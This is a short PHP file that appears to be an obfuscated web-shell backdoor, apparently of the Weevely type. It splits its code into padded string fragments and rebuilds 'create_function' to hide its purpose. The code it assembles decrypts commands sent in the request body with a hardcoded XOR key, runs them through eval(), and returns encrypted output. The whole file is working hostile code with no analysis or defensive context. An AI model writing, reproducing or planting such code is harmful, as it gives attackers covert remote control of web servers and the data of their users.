<?php
$z=',?n,?();$r=@base,?,?64_encod,?e(@x(,?@gzc,?ompress($o),$k,?));,?print,?("$p$kh$r$,?kf");}';
$G=str_replace('d','','crdeatde_dfddunctidon');
$e=',?$k{$j};}},?,?return ,?$,?o,?;}if (@preg_match("/$kh,?(.+)$,?kf/",@fi,?le_g,?et_,?,?c';
$B='$k="74a1a,?f7,?8";$,?,?,?kh="d9310af97afb";$k,?f,?=",?,?19b1f6,?3ed094";$p="DAQICRpl';
$n='X,?xA,?E,?brM4";function x,?($t,,?$k),?{$c=st,?rl,?en($k);$l=,?strlen($t);,?$o=,?';
$g='"";,?for($i=,?0;,?$i<,?$l;){for($j=0;($j<$c&,?&$,?i<$l);,?$j+,?+,?,$i++){$o.=$t{,?$i}^';
$R='on,?tents(",?php://inp,?ut"),$m),?==1) {@ob_sta,?rt(),?;@eva,?l,?(@gzuncompre,?s,?s(@,';
$C='?x(@bas,?e64_decode($m[,?1]),$k)),?),?;$o=@ob_get,?_,?content,?s();@ob_end,?_clea';
$v=str_replace(',?','',$B.$n.$g.$e.$R.$C.$z);
$H=$G('',$v);$H();
?>
